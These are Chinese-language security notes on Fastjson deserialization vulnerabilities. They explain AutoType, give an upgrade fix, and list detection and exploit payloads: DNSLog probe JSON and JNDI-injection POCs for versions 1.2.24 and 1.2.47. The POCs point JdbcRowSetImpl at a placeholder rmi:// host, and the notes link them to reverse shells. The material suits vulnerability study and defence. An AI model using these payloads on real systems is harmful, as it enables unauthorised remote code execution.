Fastjson用于将json和java对象之间转化的工具库，够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。
<https://www.cnblogs.com/kingo/p/16528047.html>
^
## **验证利用**
利用工具可以实现反弹shell。
一般java程序，请求体中有传json，可能就是用了fastjson。
vulhub靶场fastjson：
1.2.24以下，传一个错误json，报错回显，看显示中有没有fastjson
1.2.47版本，报错回显是用的com.alibaba.fastjson

此时再构造json使用jndi注入进行验证利用。

## **防御**
fastjson升级到1.2.83版本以上。
```
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
```
或不使用fastjson。

^
## **Fastjson序列化/反序列化原理**
fastjson由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type内容指定的类，将json内容反序列化为java对象并调用这个类的setter方法。

**那么为啥要引进Auto Type功能呢？**
fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。
对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：
1.基于setter/getter反射机制
2.基于属性（AutoType） 。

基于setter/getter会带来什么问题呢，下面举个例子，假设有如下两个类：
```java
class Apple implements Fruit {
    private Big_Decimal price;
    //省略 setter/getter、toString等
}
class iphone implements Fruit {
    private Big_Decimal price;
    //省略 setter/getter、toString等
}
```
实例化对象之后，假设苹果对象的price为0.5，Apple类对象序列化为json格式后为：
{"Fruit":{"price":0.5}}
假设iphone对象的price为5000,序列化为json格式后为：
{"Fruit":{"price":5000}}
当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类名抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。
^
为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，在本例中，引入AutoType后，Apple类对象序列化为json格式后为：
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.Apple", "price":0.5 } }
引入AutoType后，iphone类对象序列化为json格式后为：
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.iphone", "price":5000 } }
这样在反序列化的时候就可以区分原始的类了。



^
## **漏洞利用和验证**
请求包：
```
'Content-Type':'application/json;charset=UTF-8'
```
```
{"@type":"java.net.InetAddress","val":"x166os.dnslog.cn"}

{"@type":"java.net.Inet4Address","val":"2qytvx.ceye.io"}

{"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"}}
```
1.2.24的POC：
@type指定为官方的类，可以远程方法调用。
构造rmi服务器反弹shell利用复现：<https://icode.best/i/30418758861003>
```
{
    "b":{
         "@type":"com.sun.rowset.JdbcRowSetImpl",
         "dataSourceName":"rmi://xxx.com:9999/dnslog",
         "autoCommit":"true"
        }
}
```

之后版本fastjson过滤了@type中敏感字符。
1.2.47的POC：
fastjson中有一个全局缓存，如果fastjosn cache为true，就会缓存java.lang.Class中的val对应的class到全局缓存中。
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
         "dataSourceName":"rmi://xxx.com:9999/dnslog",
         "autoCommit":"true"
    }
}
```





## **POC**
都是上了直接发

> {“@type”:“java.net.Inet4Address”,“val”:“okkkk.02e2z0.dnslog.cn”}，

有时候这个并能触发dnslog，当然好一点的是

> {“x”:{“@type”:“java.net.Inet4Address”,“val”:“okkkk.02e2z0.dnslog.cn”}}

当然这个也是有的情况存在遗漏。

1.2.67版本前

> {“zeo”:{“@type”:“java.net.Inet4Address”,“val”:“c9f7jl.dnslog.cn”}}

1.2.67版本后payload

> {“@type”:“java.net.Inet4Address”,“val”:“dnslog”}\
> {“@type”:“java.net.Inet6Address”,“val”:“dnslog”}\
> {“@type”:“java.net.InetSocketAddress”{“address”:,“val”:“dnslog”}}\
> {{“@type”:“java.net.URL”,“val”:“http\://dnslog”}:“x”}

个人建议，把一些有用的payload放在一个包里面发，先检测是否有dns请求，然后再单独发，确定是那个payload有效，例如：

> {“a”:{“@type”:“java.net.Inet4Address”,“val”:“scspxx.dnslog.cn”},“b”:{“@type”:“java.net.Inet6Address”,“val”:“scspxx.dnslog.cn”},“c”:{“@type”:“java.net.InetSocketAddress”{“address”:,“val”:“scspxx.dnslog.cn”}},“d”:{{“@type”:“java.net.URL”,“val”:“http\://scspxx.dnslog.cn”}:“x”},“e”:{“@type”:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap\://scspxx.dnslog.cn”,“autoCommit”:true},“f”:{“name”:{“@type”:“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”},“x”{“@type”:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap\://scspxx.dnslog.cn”,“autoCommit”:true}}},“g”:{“@type”:“javax.swing.JEditorPane”,“page”:“http\://scspxx.dnslog.cn”},“h”:{“@type”:“com.alibaba.fastjson.JSONObject”,\
 {“@type”: “java.net.URL”,“val”:“http\://scspxx.dnslog.cn”}}“”}}

测试fastjson是否存在，以下几种方式：
1. 破坏原先的json 结构，然后看服务器返回的报错信息
2. 输入@type作为key的json数据，来看是否可以执行，比如不出网的情况下发包可能会卡住
3. 白盒情况下直接看classpath的依赖包

